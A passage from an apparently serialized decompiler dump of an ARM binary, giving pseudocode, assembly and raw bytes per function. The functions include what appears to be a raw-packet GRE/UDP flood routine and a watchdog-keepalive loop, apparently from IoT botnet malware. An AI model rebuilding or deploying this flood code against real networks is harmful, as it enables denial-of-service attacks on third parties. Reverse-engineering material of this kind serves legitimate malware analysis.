r3,[r11,#-0x1c]\nstrh r2,[r3,#0xa]\nldr r2,[r11,#-0x18]\nmov r3,#0x0\nstrh r3,[r2,#0x6]\nldr r3,[r11,#-0x18]\nldrh r2,[r3,#0x4]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x8\nldr r0,[r11,#-0x1c]\nldr r1,[r11,#-0x18]\nbl 0x00008da4\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0x6]\nmov r3,#0x2\nstrh r3,[r11,#-0x38]\nldr r3,[r11,#-0x44]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\nstrh r3,[r11,#-0x36]\nldr r3,[r11,#-0x40]\ncpy r0,r3\nbl 0x00008a94\ncpy r3,r0\nstr r3,[r11,#-0x34]\nldr r2,[r11,#-0x28]\nldr r3,[r11,#-0x4c]\nadd r12,r3,#0x34\nsub r3,r11,#0x38\nstr r3,[sp,#0x0]\nmov r3,#0x10\nstr r3,[sp,#0x4]\nldr r0,[r11,#-0x14]\ncpy r1,r2\ncpy r2,r12\nmov r3,#0x4000\nbl 0x00008adc\nmov r0,#0x0\nbl 0x00008b30\ncpy r1,r0\nldr r2,[r11,#-0x10]\nldr r3,[r11,#-0x48]\nadd r3,r2,r3\ncmp r1,r3\nblt 0x0000b0e4\nldr r0,[r11,#-0x14]\nbl 0x00008bcc\nmov r0,#0x0\nbl 0x00008b6c\n'
p438
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n70 d0 4d e2\n40 00 0b e5\n44 10 0b e5\n48 20 0b e5\n4c 30 0b e5\n02 00 a0 e3\n03 10 a0 e3\n06 20 a0 e3\nfd f6 ff eb\n00 30 a0 e1\n14 30 0b e5\n4c 30 1b e5\n20 30 83 e2\n07 30 83 e2\n07 30 83 e2\na3 31 a0 e1\n83 31 a0 e1\n0d d0 63 e0\n08 10 8d e2\n50 10 0b e5\n50 20 1b e5\n07 30 82 e2\na3 31 a0 e1\n83 31 a0 e1\n50 30 0b e5\n50 30 1b e5\n28 30 0b e5\n28 30 1b e5\n24 30 0b e5\n24 30 1b e5\n14 30 83 e2\n20 30 0b e5\n20 30 1b e5\n04 30 83 e2\n1c 30 0b e5\n1c 30 1b e5\n14 30 83 e2\n18 30 0b e5\n24 20 1b e5\n00 10 d2 e5\n5c 10 4b e5\n5c 10 5b e5\nb0 30 c1 e3\n40 30 83 e3\n5c 30 4b e5\n5c 30 5b e5\n00 30 c2 e5\n24 20 1b e5\n00 10 d2 e5\n64 10 4b e5\n64 10 5b e5\n0a 30 c1 e3\n05 30 83 e3\n64 30 4b e5\n64 30 5b e5\n00 30 c2 e5\n24 20 1b e5\n00 30 a0 e3\n01 30 c2 e5\n4c 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n34 30 83 e2\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\n0e f7 ff eb\n00 30 a0 e1\n03 20 a0 e1\n24 30 1b e5\nb2 20 c3 e1\ndd 00 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 28 a0 e1\n24 30 1b e5\nb4 20 c3 e1\n24 20 1b e5\n00 30 e0 e3\n08 30 c2 e5\n24 20 1b e5\n2f 30 a0 e3\n09 30 c2 e5\nac 32 9f e5\n00 20 93 e5\n24 30 1b e5\n0c 20 83 e5\n34 20 1b e5\n24 30 1b e5\n10 20 83 e5\n02 0b a0 e3\nf5 f6 ff eb\n00 30 a0 e1\n03 20 a0 e1\n20 30 1b e5\nb2 20 c3 e1\n1c 20 1b e5\n00 10 d2 e5\n6c 10 4b e5\n6c 10 5b e5\nb0 30 c1 e3\n40 30 83 e3\n6c 30 4b e5\n6c 30 5b e5\n00 30 c2 e5\n1c 20 1b e5\n00 10 d2 e5\n74 10 4b e5\n74 10 5b e5\n0a 30 c1 e3\n05 30 83 e3\n74 30 4b e5\n74 30 5b e5\n00 30 c2 e5\n1c 20 1b e5\n00 30 a0 e3\n01 30 c2 e5\n4c 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n1c 30 83 e2\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\nd4 f6 ff eb\n00 30 a0 e1\n03 20 a0 e1\n1c 30 1b e5\nb2 20 c3 e1\na3 00 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 28 a0 e1\n1c 30 1b e5\nb4 20 c3 e1\n1c 20 1b e5\n00 30 e0 e3\n08 30 c2 e5\n1c 20 1b e5\n11 30 a0 e3\n09 30 c2 e5\n97 00 00 eb\n00 20 a0 e1\n1c 30 1b e5\n0c 20 83 e5\n1c 30 1b e5\n0c 30 93 e5\n01 3b 43 e2\n03 20 e0 e1\n1c 30 1b e5\n10 20 83 e5\n8d 00 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 28 a0 e1\n18 30 1b e5\nb0 20 c3 e1\n44 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\naf f6 ff eb\n00 30 a0 e1\n03 20 a0 e1\n18 30 1b e5\nb2 20 c3 e1\n4c 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n08 30 83 e2\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\na3 f6 ff eb\n00 30 a0 e1\n03 20 a0 e1\n18 30 1b e5\nb4 20 c3 e1\n00 00 a0 e3\n94 f6 ff eb\n00 30 a0 e1\n10 30 0b e5\n24 20 1b e5\n00 30 a0 e3\nba 30 c2 e1\n24 30 1b e5\n03 00 a0 e1\n14 10 a0 e3\nf2 f6 ff eb\n00 30 a0 e1\n03 20 a0 e1\n24 30 1b e5\nba 20 c3 e1\n1c 20 1b e5\n00 30 a0 e3\nba 30 c2 e1\n1c 30 1b e5\n03 00 a0 e1\n14 10 a0 e3\ne7 f6 ff eb\n00 30 a0 e1\n03 20 a0 e1\n1c 30 1b e5\nba 20 c3 e1\n18 20 1b e5\n00 30 a0 e3\nb6 30 c2 e1\n18 30 1b e5\nb4 20 d3 e1\n4c 30 1b e5\n08 30 83 e2\n1c 00 1b e5\n18 10 1b e5\n0f f7 ff eb\n00 30 a0 e1\n03 20 a0 e1\n18 30 1b e5\nb6 20 c3 e1\n02 30 a0 e3\nb8 33 4b e1\n44 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\n70 f6 ff eb\n00 30 a0 e1\nb6 33 4b e1\n40 30 1b e5\n03 00 a0 e1\n3b f6 ff eb\n00 30 a0 e1\n34 30 0b e5\n28 20 1b e5\n4c 30 1b e5\n34 c0 83 e2\n38 30 4b e2\n00 30 8d e5\n10 30 a0 e3\n04 30 8d e5\n14 00 1b e5\n02 10 a0 e1\n0c 20 a0 e1\n01 39 a0 e3\n3f f6 ff eb\n00 00 a0 e3\n52 f6 ff eb\n00 10 a0 e1\n10 20 1b e5\n48 30 1b e5\n03 30 82 e0\n03 00 51 e1\nb9 ff ff ba\n14 00 1b e5\n71 f6 ff eb\n00 00 a0 e3\n57 f6 ff eb\n'
p439
S'.text:0000ae00\n.text:0000ae04\n.text:0000ae08\n.text:0000ae0c\n.text:0000ae10\n.text:0000ae14\n.text:0000ae18\n.text:0000ae1c\n.text:0000ae20\n.text:0000ae24\n.text:0000ae28\n.text:0000ae2c\n.text:0000ae30\n.text:0000ae34\n.text:0000ae38\n.text:0000ae3c\n.text:0000ae40\n.text:0000ae44\n.text:0000ae48\n.text:0000ae4c\n.text:0000ae50\n.text:0000ae54\n.text:0000ae58\n.text:0000ae5c\n.text:0000ae60\n.text:0000ae64\n.text:0000ae68\n.text:0000ae6c\n.text:0000ae70\n.text:0000ae74\n.text:0000ae78\n.text:0000ae7c\n.text:0000ae80\n.text:0000ae84\n.text:0000ae88\n.text:0000ae8c\n.text:0000ae90\n.text:0000ae94\n.text:0000ae98\n.text:0000ae9c\n.text:0000aea0\n.text:0000aea4\n.text:0000aea8\n.text:0000aeac\n.text:0000aeb0\n.text:0000aeb4\n.text:0000aeb8\n.text:0000aebc\n.text:0000aec0\n.text:0000aec4\n.text:0000aec8\n.text:0000aecc\n.text:0000aed0\n.text:0000aed4\n.text:0000aed8\n.text:0000aedc\n.text:0000aee0\n.text:0000aee4\n.text:0000aee8\n.text:0000aeec\n.text:0000aef0\n.text:0000aef4\n.text:0000aef8\n.text:0000aefc\n.text:0000af00\n.text:0000af04\n.text:0000af08\n.text:0000af0c\n.text:0000af10\n.text:0000af14\n.text:0000af18\n.text:0000af1c\n.text:0000af20\n.text:0000af24\n.text:0000af28\n.text:0000af2c\n.text:0000af30\n.text:0000af34\n.text:0000af38\n.text:0000af3c\n.text:0000af40\n.text:0000af44\n.text:0000af48\n.text:0000af4c\n.text:0000af50\n.text:0000af54\n.text:0000af58\n.text:0000af5c\n.text:0000af60\n.text:0000af64\n.text:0000af68\n.text:0000af6c\n.text:0000af70\n.text:0000af74\n.text:0000af78\n.text:0000af7c\n.text:0000af80\n.text:0000af84\n.text:0000af88\n.text:0000af8c\n.text:0000af90\n.text:0000af94\n.text:0000af98\n.text:0000af9c\n.text:0000afa0\n.text:0000afa4\n.text:0000afa8\n.text:0000afac\n.text:0000afb0\n.text:0000afb4\n.text:0000afb8\n.text:0000afbc\n.text:0000afc0\n.text:0000afc4\n.text:0000afc8\n.text:0000afcc\n.text:0000afd0\n.text:0000afd4\n.text:0000afd8\n.text:0000afdc\n.text:0000afe0\n.text:0000afe4\n.text:0000afe8\n.text:0000afec\n.text:0000aff0\n.text:0000aff4\n.text:0000aff8\n.text:0000affc\n.text:0000b000\n.text:0000b004\n.text:0000b008\n.text:0000b00c\n.text:0000b010\n.text:0000b014\n.text:0000b018\n.text:0000b01c\n.text:0000b020\n.text:0000b024\n.text:0000b028\n.text:0000b02c\n.text:0000b030\n.text:0000b034\n.text:0000b038\n.text:0000b03c\n.text:0000b040\n.text:0000b044\n.text:0000b048\n.text:0000b04c\n.text:0000b050\n.text:0000b054\n.text:0000b058\n.text:0000b05c\n.text:0000b060\n.text:0000b064\n.text:0000b068\n.text:0000b06c\n.text:0000b070\n.text:0000b074\n.text:0000b078\n.text:0000b07c\n.text:0000b080\n.text:0000b084\n.text:0000b088\n.text:0000b08c\n.text:0000b090\n.text:0000b094\n.text:0000b098\n.text:0000b09c\n.text:0000b0a0\n.text:0000b0a4\n.text:0000b0a8\n.text:0000b0ac\n.text:0000b0b0\n.text:0000b0b4\n.text:0000b0b8\n.text:0000b0bc\n.text:0000b0c0\n.text:0000b0c4\n.text:0000b0c8\n.text:0000b0cc\n.text:0000b0d0\n.text:0000b0d4\n.text:0000b0d8\n.text:0000b0dc\n.text:0000b0e0\n.text:0000b0e4\n.text:0000b0e8\n.text:0000b0ec\n.text:0000b0f0\n.text:0000b0f4\n.text:0000b0f8\n.text:0000b0fc\n.text:0000b100\n.text:0000b104\n.text:0000b108\n.text:0000b10c\n.text:0000b110\n.text:0000b114\n.text:0000b118\n.text:0000b11c\n.text:0000b120\n.text:0000b124\n.text:0000b128\n.text:0000b12c\n.text:0000b130\n.text:0000b134\n.text:0000b138\n.text:0000b13c\n.text:0000b140\n.text:0000b144\n.text:0000b148\n.text:0000b14c\n.text:0000b150\n.text:0000b154\n.text:0000b158\n.text:0000b15c\n.text:0000b160\n.text:0000b164\n.text:0000b168\n.text:0000b16c\n.text:0000b170\n.text:0000b174\n.text:0000b178\n.text:0000b17c\n.text:0000b180\n.text:0000b184\n.text:0000b188\n.text:0000b18c\n.text:0000b190\n.text:0000b194\n.text:0000b198\n.text:0000b19c\n.text:0000b1a0\n.text:0000b1a4\n.text:0000b1a8\n.text:0000b1ac\n.text:0000b1b0\n.text:0000b1b4\n.text:0000b1b8\n.text:0000b1bc\n.text:0000b1c0\n.text:0000b1c4\n.text:0000b1c8\n.text:0000b1cc\n.text:0000b1d0\n.text:0000b1d4\n.text:0000b1d8\n.text:0000b1dc\n.text:0000b1e0\n.text:0000b1e4\n.text:0000b1e8\n.text:0000b1ec\n.text:0000b1f0\n.text:0000b1f4\n.text:0000b1f8\n.text:0000b1fc\n.text:0000b200\n.text:0000b204\n.text:0000b208\n'
p440
tp441
sS'getppid'
p442
(S'\n__stdcall getppid()\n'
p443
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t getppid(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b2c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_0001414c)();\u000a  return _Var1;\u000a}\u000a\u000a
p444
S'adr r12,0x8b2c\nadd r12,r12,#0xb000\nldr pc,[r12,#0x620]!\n'
p445
S'00 c6 8f e2\n0b ca 8c e2\n20 f6 bc e5\n'
p446
S'.plt:00008b24\n.plt:00008b28\n.plt:00008b2c\n'
p447
tp448
sS'FUN_0000b210'
p449
(S'\n__stdcall FUN_0000b210()\n'
p450
V\u000avoid FUN_0000b210(void)\u000a\u000a{\u000a  time_t tVar1;\u000a  uint uVar2;\u000a  uint uVar3;\u000a  clock_t cVar4;\u000a  \u000a  tVar1 = time((time_t *)0x0);\u000a  *(time_t *)PTR_DAT_0000b294 = tVar1;\u000a  uVar2 = getpid();\u000a  uVar3 = getppid();\u000a  *(uint *)PTR_DAT_0000b298 = uVar2 ^ uVar3;\u000a  cVar4 = clock();\u000a  *(clock_t *)PTR_DAT_0000b29c = cVar4;\u000a  *(uint *)PTR_DAT_0000b2a0 = *(uint *)PTR_DAT_0000b29c ^ *(uint *)PTR_DAT_0000b298;\u000a  return;\u000a}\u000a\u000a
p451
S'cpy r12,sp\nstmdb sp!,{ r4 r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x4\nmov r0,#0x0\nbl 0x00008b30\ncpy r3,r0\ncpy r2,r3\nldr r3,[0xb294]\nstr r2,[r3,#0x0]\nbl 0x000089ec\ncpy r4,r0\nbl 0x00008b24\ncpy r3,r0\neor r3,r4,r3\ncpy r2,r3\nldr r3,[0xb298]\nstr r2,[r3,#0x0]\nbl 0x00008ba8\ncpy r3,r0\ncpy r2,r3\nldr r3,[0xb29c]\nstr r2,[r3,#0x0]\nldr r3,[0xb29c]\nldr r2,[r3,#0x0]\nldr r3,[0xb298]\nldr r3,[r3,#0x0]\neor r2,r2,r3\nldr r3,[0xb2a0]\nstr r2,[r3,#0x0]\nsub sp,r11,#0x10\nldmia sp,{ r4 r11 sp lr }\nbx lr\n'
p452
S'0d c0 a0 e1\n10 d8 2d e9\n04 b0 4c e2\n04 d0 4d e2\n00 00 a0 e3\n41 f6 ff eb\n00 30 a0 e1\n03 20 a0 e1\n5c 30 9f e5\n00 20 83 e5\neb f5 ff eb\n00 40 a0 e1\n37 f6 ff eb\n00 30 a0 e1\n03 30 24 e0\n03 20 a0 e1\n40 30 9f e5\n00 20 83 e5\n52 f6 ff eb\n00 30 a0 e1\n03 20 a0 e1\n30 30 9f e5\n00 20 83 e5\n28 30 9f e5\n00 20 93 e5\n1c 30 9f e5\n00 30 93 e5\n03 20 22 e0\n18 30 9f e5\n00 20 83 e5\n10 d0 4b e2\n10 68 9d e8\n1e ff 2f e1\n'
p453
S'.text:0000b210\n.text:0000b214\n.text:0000b218\n.text:0000b21c\n.text:0000b220\n.text:0000b224\n.text:0000b228\n.text:0000b22c\n.text:0000b230\n.text:0000b234\n.text:0000b238\n.text:0000b23c\n.text:0000b240\n.text:0000b244\n.text:0000b248\n.text:0000b24c\n.text:0000b250\n.text:0000b254\n.text:0000b258\n.text:0000b25c\n.text:0000b260\n.text:0000b264\n.text:0000b268\n.text:0000b26c\n.text:0000b270\n.text:0000b274\n.text:0000b278\n.text:0000b27c\n.text:0000b280\n.text:0000b284\n.text:0000b288\n.text:0000b28c\n.text:0000b290\n'
p454
tp455
sS'FUN_00009200'
p456
(S'\n__stdcall FUN_00009200()\n'
p457
V\u000avoid FUN_00009200(void)\u000a\u000a{\u000a  char *__file;\u000a  undefined4 local_34;\u000a  int local_30;\u000a  int local_2c;\u000a  int local_28;\u000a  int local_24;\u000a  int local_20;\u000a  int local_1c;\u000a  int local_18;\u000a  int local_14;\u000a  undefined4 uStack4;\u000a  \u000a  uStack4 = 0x920c;\u000a  local_30 = 0;\u000a  local_2c = 0;\u000a  local_28 = 0;\u000a  local_24 = 0;\u000a  local_20 = 0;\u000a  local_1c = 0;\u000a  local_18 = 0;\u000a  local_34 = 0x3c;\u000a  local_14 = 0;\u000a  FUN_0000b928(4);\u000a  FUN_0000b928(5);\u000a  FUN_0000b928(6);\u000a  FUN_0000b928(7);\u000a  FUN_0000b928(8);\u000a  FUN_0000b928(9);\u000a  FUN_0000b928(10);\u000a  __file = (char *)FUN_0000b9c0(4,0);\u000a  local_30 = open(__file,2);\u000a  if (local_30 == -1) {\u000a    __file = (char *)FUN_0000b9c0(5,0);\u000a    local_2c = open(__file,2);\u000a    if (local_2c == -1) {\u000a      __file = (char *)FUN_0000b9c0(6,0);\u000a      local_28 = open(__file,2);\u000a      if (local_28 == -1) {\u000a        __file = (char *)FUN_0000b9c0(7,0);\u000a        local_24 = open(__file,2);\u000a        if (local_24 == -1) {\u000a          __file = (char *)FUN_0000b9c0(8,0);\u000a          local_20 = open(__file,2);\u000a          if (local_20 == -1) {\u000a            __file = (char *)FUN_0000b9c0(9,0);\u000a            local_1c = open(__file,2);\u000a            if (local_1c == -1) {\u000a              __file = (char *)FUN_0000b9c0(10,0);\u000a              local_18 = open(__file,2);\u000a              if (local_18 == -1) goto LAB_000094c8;\u000a            }\u000a          }\u000a        }\u000a      }\u000a    }\u000a  }\u000a  local_14 = 1;\u000a  ioctl(local_30,0x80045704,&local_34);\u000a  ioctl(local_2c,0x80045704,&local_34);\u000a  ioctl(local_28,0x80045704,&local_34);\u000a  ioctl(local_24,0x80045704,&local_34);\u000a  ioctl(local_20,0x80045704,&local_34);\u000a  ioctl(local_1c,0x80045704,&local_34);\u000a  ioctl(local_18,0x80045704,&local_34);\u000aLAB_000094c8:\u000a  if (local_14 == 1) {\u000a    do {\u000a      ioctl(local_30,0x80045705,0);\u000a      ioctl(local_2c,0x80045705,0);\u000a      ioctl(local_28,0x80045705,0);\u000a      ioctl(local_24,0x80045705,0);\u000a      ioctl(local_20,0x80045705,0);\u000a      ioctl(local_1c,0x80045705,0);\u000a      ioctl(local_18,0x80045705,0);\u000a      sleep(5);\u000a    } while( true );\u000a  }\u000a  FUN_0000b974(4);\u000a  FUN_0000b974(5);\u000a  FUN_0000b974(6);\u000a  FUN_0000b974(7);\u000a  FUN_0000b974(8);\u000a  FUN_0000b974(9);\u000a  FUN_0000b974(10);\u000a  return;\u000a}\u000a\u000a
p458
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x28\nsub r3,r11,#0x2c\nmov r2,#0x0\nstr r2,[r3,#0x0]\nadd r3,r3,#0x4\nmov r2,#0x0\nstr r2,[r3,#0x0]\nadd r3,r3,#0x4\nmov r2,#0x0\nstr r2,[r3,#0x0]\nadd r3,r3,#0x4\nmov r2,#0x0\nstr r2,[r3,#0x0]\nadd r3,r3,#0x4\nmov r2,#0x0\nstr r2,[r3,#0x0]\nadd r3,r3,#0x4\nmov r2,#0x0\nstr r2,[r3,#0x0]\nadd r3,r3,#0x4\nmov r2,#0x0\nstr r2,[r3,#0x0]\nmov r3,#0x3c\nstr r3,[r11,#-0x30]\nmov r3,#0x0\nstr r3,[r11,#-0x10]\nmov r0,#0x4\nbl 0x0000b928\nmov r0,#0x5\nbl 0x0000b928\nmov r0,#0x6\nbl 0x0000b928\nmov r0,#0x7\nbl 0x0000b928\nmov r0,#0x8\nbl 0x0000b928\nmov r0,#0x9\nbl 0x0000b928\nmov r0,#0xa\nbl 0x0000b928\nmov r0,#0x4\nmov r1,#0x0\nbl 0x0000b9c0\ncpy r3,r0\ncpy r0,r3\nmov r1,#0x2\nbl 0x00008b9c\ncpy r3,r0\nstr r3,[r11,#-0x2c]\nldr r3,[r11,#-0x2c]\ncmn r3,#0x1\nbne 0x000093fc\nmov r0,#0x5\nmov r1,#0x0\nbl 0x0000b9c0\ncpy r3,r0\ncpy r0,r3\nmov r1,#0x2\nbl 0x00008b9c\ncpy r3,r0\nstr r3,[r11,#-0x28]\nldr r3,[r11,#-0x28]\ncmn r3,#0x1\nbne 0x000093fc\nmov r0,#0x6\nmov r1,#0x0\nbl 0x0000b9c0\ncpy r3,r0\ncpy r0,r3\nmov r1,#0x2\nbl 0x00008b9c\ncpy r3,r0\nstr r3,[r11,#-0x24]\nldr r3,[r11,#-0x24]\ncmn r3,#0x1\nbne 0x000093fc\nmov r0,#0x7\nmov r1,#0x0\nbl 0x0000b9c0\ncpy r3,r0\ncpy r0,r3\nmov r1,#0x2\nbl 0x00008b9c\ncpy r3,r0\nstr r3,[r11,#-0x20]\nldr r3,[r11,#-0x20]\ncmn r3,#0x1\nbne 0x000093fc\nmov r0,#0x8\nmov r1,#0x0\nbl 0x0000b9c0\ncpy r3,r0\ncpy r0,r3\nmov r1,#0x2\nbl 0x00008b9c\ncpy r3,r0\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x1c]\ncmn r3,#0x1\nbne 0x000093fc\nmov r0,#0x9\nmov r1,#0x0\nbl 0x0000b9c0\ncpy r3,r0\ncpy r0,r3\nmov r1,#0x2\nbl 0x00008b9c\ncpy r3,r0\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x18]\ncmn r3,#0x1\nbne 0x000093fc\nmov r0,#0xa\nmov r1,#0x0\nbl 0x0000b9c0\ncpy r3,r0\ncpy r0,r3\nmov r1,#0x2\nbl 0x00008b9c\ncpy r3,r0\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x14]\ncmn r3,#0x1\nbeq 0x000094c8\nmov r3,#0x1\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x2c]\nsub r2,r11,#0x30\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000004\nbl 0x000089c8\nldr r3,[r11,#-0x28]\nsub r2,r11,#0x30\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000004\nbl 0x000089c8\nldr r3,[r11,#-0x24]\nsub r2,r11,#0x30\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000004\nbl 0x000089c8\nldr r3,[r11,#-0x20]\nsub r2,r11,#0x30\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000004\nbl 0x000089c8\nldr r3,[r11,#-0x1c]\nsub r2,r11,#0x30\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000004\nbl 0x000089c8\nldr r3,[r11,#-0x18]\nsub r2,r11,#0x30\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000004\nbl 0x000089c8\nldr r3,[r11,#-0x14]\nsub r2,r11,#0x30\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000004\nbl 0x000089c8\nldr r3,[r11,#-0x10]\ncmp r3,#0x1\nbne 0x000095a4\nldr r3,[r11,#-0x2c]\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000005\nmov r2,#0x0\nbl 0x000089c8\nldr r3,[r11,#-0x28]\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000005\nmov r2,#0x0\nbl 0x000089c8\nldr r3,[r11,#-0x24]\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000005\nmov r2,#0x0\nbl 0x000089c8\nldr r3,[r11,#-0x20]\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000005\nmov r2,#0x0\nbl 0x000089c8\nldr r3,[r11,#-0x1c]\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000005\nmov r2,#0x0\nbl 0x000089c8\nldr r3,[r11,#-0x18]\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000005\nmov r2,#0x0\nbl 0x000089c8\nldr r3,[r11,#-0x14]\ncpy r0,r3\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000005\nmov r2,#0x0\nbl 0x000089c8\nmov r0,#0x5\nbl 0x00008a1c\nb 0x000094d4\nmov r0,#0x4\nbl 0x0000b974\nmov r0,#0x5\nbl 0x0000b974\nmov r0,#0x6\nbl 0x0000b974\nmov r0,#0x7\nbl 0x0000b974\nmov r0,#0x8\nbl 0x0000b974\nmov r0,#0x9\nbl 0x0000b974\nmov r0,#0xa\nbl 0x0000b974\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p459
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n28 d0 4d e2\n2c 30 4b e2\n00 20 a0 e3\n00 20 83 e5\n04 30 83 e2\n00 20 a0 e3\n00 20 83 e5\n04 30 83 e2\n00 20 a0 e3\n00 20 83 e5\n04 30 83 e2\n00 20 a0 e3\n00 20 83 e5\n04 30 83 e2\n00 20 a0 e3\n00 20 83 e5\n04 30 83 e2\n00 20 a0 e3\n00 20 83 e5\n04 30 83 e2\n00 20 a0 e3\n00 20 83 e5\n3c 30 a0 e3\n30 30 0b e5\n00 30 a0 e3\n10 30 0b e5\n04 00 a0 e3\naa 09 00 eb\n05 00 a0 e3\na8 09 00 eb\n06 00 a0 e3\na6 09 00 eb\n07 00 a0 e3\na4 09 00 eb\n08 00 a0 e3\na2 09 00 eb\n09 00 a0 e3\na0 09 00 eb\n0a 00 a0 e3\n9e 09 00 eb\n04 00 a0 e3\n00 10 a0 e3\nc1 09 00 eb\n00 30 a0 e1\n03 00 a0 e1\n02 10 a0 e3\n34 fe ff eb\n00 30 a0 e1\n2c 30 0b e5\n2c 30 1b e5\n01 00 73 e3\n47 00 00 1a\n05 00 a0 e3\n00 10 a0 e3\nb5 09 00 eb\n00 30 a0 e1\n03 00 a0 e1\n02 10 a0 e3\n28 fe ff eb\n00 30 a0 e1\n28 30 0b e5\n28 30 1b e5\n01 00 73 e3\n3b 00 00 1a\n06 00 a0 e3\n00 10 a0 e3\na9 09 00 eb\n00 30 a0 e1\n03 00 a0 e1\n02 10 a0 e3\n1c fe ff eb\n00 30 a0 e1\n24 30 0b e5\n24 30 1b e5\n01 00 73 e3\n2f 00 00 1a\n07 00 a0 e3\n00 10 a0 e3\n9d 09 00 eb\n00 30 a0 e1\n03 00 a0 e1\n02 10 a0 e3\n10 fe ff eb\n00 30 a0 e1\n20 30 0b e5\n20 30 1b e5\n01 00 73 e3\n23 00 00 1a\n08 00 a0 e3\n00 10 a0 e3\n91 09 00 eb\n00 30 a0 e1\n03 00 a0 e1\n02 10 a0 e3\n04 fe ff eb\n00 30 a0 e1\n1c 30 0b e5\n1c 30 1b e5\n01 00 73 e3\n17 00 00 1a\n09 00 a0 e3\n00 10 a0 e3\n85 09 00 eb\n00 30 a0 e1\n03 00 a0 e1\n02 10 a0 e3\nf8 fd ff eb\n00 30 a0 e1\n18 30 0b e5\n18 30 1b e5\n01 00 73 e3\n0b 00 00 1a\n0a 00 a0 e3\n00 10 a0 e3\n79 09 00 eb\n00 30 a0 e1\n03 00 a0 e1\n02 10 a0 e3\nec fd ff eb\n00 30 a0 e1\n14 30 0b e5\n14 30 1b e5\n01 00 73 e3\n32 00 00 0a\n01 30 a0 e3\n10 30 0b e5\n2c 30 1b e5\n30 20 4b e2\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n12 11 81 e2\n69 fd ff eb\n28 30 1b e5\n30 20 4b e2\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n12 11 81 e2\n62 fd ff eb\n24 30 1b e5\n30 20 4b e2\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n12 11 81 e2\n5b fd ff eb\n20 30 1b e5\n30 20 4b e2\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n12 11 81 e2\n54 fd ff eb\n1c 30 1b e5\n30 20 4b e2\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n12 11 81 e2\n4d fd ff eb\n18 30 1b e5\n30 20 4b e2\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n12 11 81 e2\n46 fd ff eb\n14 30 1b e5\n30 20 4b e2\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n12 11 81 e2\n3f fd ff eb\n10 30 1b e5\n01 00 53 e3\n33 00 00 1a\n2c 30 1b e5\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n16 11 81 e2\n00 20 a0 e3\n35 fd ff eb\n28 30 1b e5\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n16 11 81 e2\n00 20 a0 e3\n2e fd ff eb\n24 30 1b e5\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n16 11 81 e2\n00 20 a0 e3\n27 fd ff eb\n20 30 1b e5\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n16 11 81 e2\n00 20 a0 e3\n20 fd ff eb\n1c 30 1b e5\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n16 11 81 e2\n00 20 a0 e3\n19 fd ff eb\n18 30 1b e5\n03 00 a0 e1\n45 1a a0 e3\n07 1c 81 e2\n16 11 81 e2\n00 20 a0 e3\n12 fd ff eb\n14 30 1b e5\n03 00 a0 e1\n45 